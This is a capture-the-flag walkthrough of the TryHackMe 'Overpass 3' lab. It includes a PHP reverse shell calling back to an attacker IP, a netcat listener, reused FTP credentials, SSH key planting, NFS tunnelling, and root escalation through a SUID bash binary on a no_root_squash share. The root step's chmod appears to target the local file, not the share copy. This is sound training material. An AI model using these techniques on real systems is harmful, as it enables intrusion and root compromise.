# [Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)

## You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

### Web Flag

_This flag belongs to apache_

1. Start with a port scan to identify open services on the target machine:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix
```

2. Enumerate directories and files on the web server using Gobuster:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/backups
```

3. Download `backup.zip` from `http://<TARGET_IP>/backups/`. Extract its contents. Inside there is `CustomerDetails.xlsx.gpg` and `priv.key`. Import the key and decrypt the file:

```bash
gpg --import priv.key
gpg CustomerDetails.xlsx.gpg
```

4. Open `CustomerDetails.xlsx` to find customer credentials. One of the entries contains FTP credentials for the user `paradox`.

5. Log into the FTP server using the discovered credentials:

```bash
ftp <TARGET_IP>
# Name: paradox
# Password: ShibesAreGreat123
```

6. Create a PHP reverse shell script on your attacker machine. This will connect back to your machine when executed by the web server:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

7. Upload the reverse shell to the web server via FTP:

```bash
put shell.php
```

8. Start a Netcat listener on your attacker machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

9. Trigger the reverse shell by visiting `http://<TARGET_IP>/shell.php` in your browser. You should receive a shell connection in your Netcat listener running as the `apache` user.

10. Search the filesystem for files containing "flag" in their name:

```bash
find / -name "*flag*" 2>/dev/null
```

**Results:**

```bash
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/kpageflags
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/pci0000:00/0000:00:05.0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/bin/pflags
/usr/sbin/grub2-set-bootflag
/usr/share/man/man1/grub2-set-bootflag.1.gz
/usr/share/httpd/web.flag
```

11. Read the web flag:

```bash
cat /usr/share/httpd/web.flag
```

[SCREEN01]

---

### User Flag

_This flag belongs to james_

1. Switch to the `paradox` user using the password found earlier and spawn a proper TTY shell:

```bash
su paradox
# Password: ShibesAreGreat123
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. Download the LinPEAS privilege escalation enumeration script on your attacker machine and upload it to the target via FTP:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
ftp <TARGET_IP>
# Name: paradox
# Password: ShibesAreGreat123
put linpeas.sh
```

3. Navigate to the web root where the file was uploaded, make it executable and run it:

```bash
cd /var/www/html
chmod +x linpeas.sh
./linpeas.sh
```

**Results:**

```
╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/home/paradox/.local/bin:/home/paradox/bin:/usr/local/bin:/usr/bin

╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts:
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

The `no_root_squash` option means that if we mount this NFS share as root on our attacker machine, we will have root-level access to the share. We can exploit this to escalate privileges.

4. To access the NFS share, we first need SSH access as `paradox` to set up port forwarding. Generate an SSH key pair on your attacker machine:

```bash
ssh-keygen -f paradox
```

5. Append the generated public key to `paradox`'s `authorized_keys` file on the target:

```bash
echo "<GENERATED_PUBLIC_KEY>" >> /home/paradox/.ssh/authorized_keys
```

6. Now SSH into the target as `paradox` using the private key to verify access:

```bash
ssh -i paradox paradox@<TARGET_IP>
```

7. Verify that the NFS service is running and check which ports it is using:

```bash
rpcinfo -p
```

**Results:**

```
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  58525  status
    100024    1   tcp  39615  status
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  46271  nlockmgr
    100021    3   udp  46271  nlockmgr
    100021    4   udp  46271  nlockmgr
    100021    1   tcp  34207  nlockmgr
    100021    3   tcp  34207  nlockmgr
    100021    4   tcp  34207  nlockmgr
```

The NFS service is running on port 2049. Since it is only accessible internally, we need to tunnel it to our attacker machine.

8. Set up an SSH tunnel to forward the remote NFS port to your local machine:

```bash
ssh -L 2049:localhost:2049 -i paradox paradox@<TARGET_IP>
```

9. Create a mount point and mount the NFS share through the tunnel:

```bash
mkdir nfs
sudo mount -v -t nfs localhost:/ nfs
```

10. Read the user flag from james's home directory:

```bash
cat nfs/user.flag
```

[SCREEN02]

---

### Root flag

1. Since we have root-level access to the NFS share thanks to `no_root_squash`, copy james's SSH private key from the mounted share to your attacker machine:

```bash
cp nfs/.ssh/id_rsa james_id_rsa
```

2. Use the copied private key to SSH into the target as `james`:

```bash
ssh -i james_id_rsa james@<TARGET_IP>
```

3. As `paradox`, copy the system `bash` binary to the web root so it can be downloaded from the web server:

```bash
cp /bin/bash /var/www/html/bash
```

4. On your attacker machine, download the `bash` binary from the web server, then copy it into the NFS share. Since we have root access over the NFS mount, set the SUID bit on it. This will make it execute as root when run by any user:

```bash
cp bash nfs/bash
chmod +xs bash
```

5. Back in the SSH session as `james`, the SUID `bash` binary is now present in his home directory. Run it with the `-p` flag, which preserves the effective UID, then read the root flag:

```bash
./bash -p
cat /root/root.flag
```

[SCREEN03]
